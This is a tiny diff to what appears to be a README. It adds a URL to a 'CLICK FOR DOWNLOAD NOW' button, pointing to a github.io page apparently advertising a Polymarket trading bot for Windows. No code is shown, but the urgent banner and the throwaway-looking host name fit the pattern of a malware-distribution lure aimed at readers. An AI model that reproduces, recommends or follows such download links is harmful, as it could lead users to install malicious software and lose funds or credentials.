@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://polymarket-g-bot-pcwin-vm12.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
